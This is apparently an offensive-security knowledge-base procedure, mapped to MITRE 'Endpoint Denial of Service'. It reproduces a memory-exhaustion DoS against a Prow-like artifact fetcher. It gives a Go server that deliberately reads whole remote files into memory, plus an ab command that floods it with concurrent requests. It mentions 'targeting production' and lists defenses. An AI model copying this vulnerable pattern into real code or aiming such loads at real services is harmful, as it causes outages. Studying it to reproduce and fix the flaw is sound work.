---
tags:
  - dos-simulation
  - load-testing
  - go
  - oom
type: procedure
tools:
  - '[[tools/ab-apache-benchmark]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/ab-load-test-concurrent-requests]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:37.238Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: f889276b-491a-4d25-b147-fec3daacae61
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Simulate-DoS-with-Local-Go-Server-and-Load-Testing

## Summary

This procedure simulates the DoS vulnerability locally by creating a Go HTTP server that mimics the Prow artifact fetcher, loading large files into memory, and using concurrent requests to trigger OOM conditions.

## Description

A simple Go server fetches a large file (e.g., 10MB.BIN or GCS object) using http.Client and ioutil.ReadAll(), replicating the vulnerable behavior. Concurrent load testing with Apache Benchmark demonstrates memory exhaustion, validating the impact before targeting production.

## Requirements

1. Go installed (version 1.16+ for ioutil)
2. Access to a large test file (local or GCS)
3. Apache Benchmark (ab) tool
4. Port 8090 available

## Defense

Defensive measures and detection strategies:

- Stream large responses instead of full memory loads
- Enforce max object size in fetchers (e.g., <1MB)
- Monitor process memory and kill on high usage

## Objectives

1. Reproduce slow and memory-intensive fetches
2. Trigger OOM with concurrency
3. Quantify resource impact

## Instructions

### Step 1: Implement Mock Go Server

**Context**: Create a local HTTP server endpoint that downloads and serves a large file entirely into memory.

Write a Go program (server.go):
```go
package main
import (
    "io/ioutil"
    "net/http"
)

func downloadHandler(w http.ResponseWriter, r *http.Request) {
    resp, _ := http.Get("https://storage.googleapis.com/kubernetes-jenkins/cache/poc/k8s-test-cache.tar.gz")
    defer resp.Body.Close()
    body, _ := ioutil.ReadAll(resp.Body) // Vulnerable: loads entire file into memory
    w.Write(body)
}

func main() {
    http.HandleFunc("/download", downloadHandler)
    http.ListenAndServe(":8090", nil)
}
```
Compile and run: `go run server.go`

### Step 2: Perform Load Testing

**Context**: Send concurrent requests to the local endpoint to simulate exploitation and cause OOM.

Execute [[commands/ab-load-test-concurrent-requests]]:

```bash
ab -n 30 -c 30 http://localhost:8090/download
```

> This sends 30 total requests with 30 concurrent connections, forcing multiple full downloads into memory, leading to OOM as observed in server logs or process termination.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/ab-load-test-concurrent-requests]]

## Tools Used

- [[tools/ab-apache-benchmark]]

## Tags

- simulation
- go
- load-testing
